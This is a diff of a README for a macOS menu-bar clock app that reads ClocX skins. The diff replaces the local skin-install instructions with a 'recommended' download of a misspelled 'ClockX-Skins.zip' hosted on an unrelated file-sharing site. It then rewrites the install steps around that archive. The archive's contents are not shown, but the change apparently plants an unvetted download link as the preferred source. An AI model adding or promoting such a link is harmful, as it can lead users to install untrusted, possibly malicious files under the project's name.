@@ -28,21 +28,23 @@ A macOS menu-bar clock inspired by the classic Windows freeware **ClocX**. Displ
 
 Klok reads the same `.ini` + image format used by the original Windows ClocX. You can use the thousands of skins accumulated by the ClocX community over the years.
 
-### Installing skins
-
-Drop any ClocX skin folder (containing a `.png`/`.bmp` and optional `.ini` file) into:
-
-```
-~/Library/Application Support/Klok/Skins/
-```
-
-Restart Klok and select the skin in **Preferences → Appearance**.
-
 ### Where to get ClocX skins
+
+**Pre-packaged skin pack (recommended)** — hundreds of curated community skins, ready to load:
+
+👉 **[Download ClockX-Skins.zip](https://wwbjv.lanzout.com/i9rBb3skqt7e)**
+
+Other sources:
 
 - **ClocX official skin library**: [clockx.narod.ru](http://clockx.narod.ru/) — hundreds of officially listed skins
 - **DeviantArt**: search [`ClocX skin`](https://www.deviantart.com/search?q=clockx+skin) — community-designed originals
 - Various Windows software sharing forums: search "ClocX skins pack"
+
+### Installing skins
+
+1. Download and unzip `ClockX-Skins.zip` to any folder (e.g. `~/Documents/ClockX-Skins/`)
+2. Open **Preferences → Appearance** and click **Browse…** to select that folder
+3. The skin list refreshes immediately — click any skin to apply it
 
 > Note: third-party skins are copyrighted by their respective creators. Please respect the author's license terms.
 
